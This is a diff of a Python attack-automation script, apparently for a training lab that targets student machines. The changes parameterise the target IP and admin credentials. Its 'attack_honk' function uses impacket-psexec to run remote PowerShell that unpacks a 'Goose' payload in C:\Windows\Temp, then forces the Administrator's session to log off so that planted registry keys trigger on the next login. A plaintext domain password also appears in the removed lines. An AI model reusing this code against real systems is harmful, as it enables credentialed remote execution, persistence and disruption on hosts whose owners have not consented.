@@ -26,7 +26,7 @@ BIND_PORT = 8080
 
 # Concurrency Settings
 # 10 workers means 10 students can be processed simultaneously.
-MAX_WORKERS = 10
+MAX_WORKERS = 30
 # ===============================================
 
 # Global Queue to hold the attacks
@@ -144,7 +144,8 @@ def attack_honk(target_ip):
     print(f"\n[!!!] Releasing the Goose on {target_ip}")
     zip_name = "Goose.zip"
 
-# --- CONFIGURATION ---
+    # --- CONFIGURATION ---
+    # Note: These paths are for the smbclient upload, which handles strings differently
     remote_path = "C:\\Windows\\Temp"
     zip_path = f"{remote_path}\\Goose.zip"
     dest_path = f"{remote_path}\\Goose"
@@ -154,7 +155,10 @@ def attack_honk(target_ip):
 
     # --- STEP 2: UNZIP ---
     print(f"[*] [{target_ip}] Extracting with PowerShell...")
-    cmd = r"""impacket-psexec OSEC/j.davis:'P@ssword123!'@192.168.103.242 "powershell -Command Expand-Archive -Path 'C:\Windows\Temp\Goose.zip' -DestinationPath 'C:\Windows\Temp\Goose' -Force" """
+    
+    # FIX: Use f-string, inject target_ip, and DOUBLE ESCAPE backslashes for Windows paths
+    cmd = f"""impacket-psexec {ADMIN_USER}:{ADMIN_PASS}@{target_ip} "powershell -Command Expand-Archive -Path 'C:\\Windows\\Temp\\Goose.zip' -DestinationPath 'C:\\Windows\\Temp\\Goose' -Force" """
+    
     subprocess.run(cmd, shell=True)
 
     # --- STEP 3: HONK ---
@@ -164,18 +168,14 @@ def attack_honk(target_ip):
 
     # --- STEP 4: LOG USER OUT ---
     print("[*] Querying active sessions for 'Administrator'...")
-    # We use 'query user' to get the table of logged-in users
-    check_cmd = r"""impacket-psexec OSEC/j.davis:'P@ssword123!'@192.168.103.242 "query user Administrator" """
+    
+    # FIX: Inject target_ip and global credentials
+    check_cmd = f"""impacket-psexec {ADMIN_USER}:{ADMIN_PASS}@{target_ip} "query user Administrator" """
 
     try:
         # Run the command and capture the output (stdout)
         output = subprocess.check_output(check_cmd, shell=True, stderr=subprocess.STDOUT).decode()
         
-        # 2. Parse the output to find the ID
-        # Output looks like:  ">Administrator   console    2  Active ..."
-        # We look for the line containing "Administrator" and grab the digit in the ID column.
-        
-        # This regex looks for 'Administrator', skips some whitespace/text, and grabs the first number it sees (the ID).
         match = re.search(r"Administrator\s+\S+\s+(\d+)", output, re.IGNORECASE)
         
         if match:
@@ -184,7 +184,10 @@ def attack_honk(target_ip):
             
             # 3. Kill that specific session
             print(f"[*] Forcing Logoff for Session {session_id}...")
-            kill_cmd = f"""impacket-psexec OSEC/j.davis:'P@ssword123!'@192.168.103.242 "logoff {session_id}" """
+            
+            # FIX: Inject target_ip here as well
+            kill_cmd = f"""impacket-psexec {ADMIN_USER}:{ADMIN_PASS}@{target_ip} "logoff {session_id}" """
+            
             subprocess.run(kill_cmd, shell=True)
             print("[+] Logoff command sent. Registry keys should trigger on next login.")
             
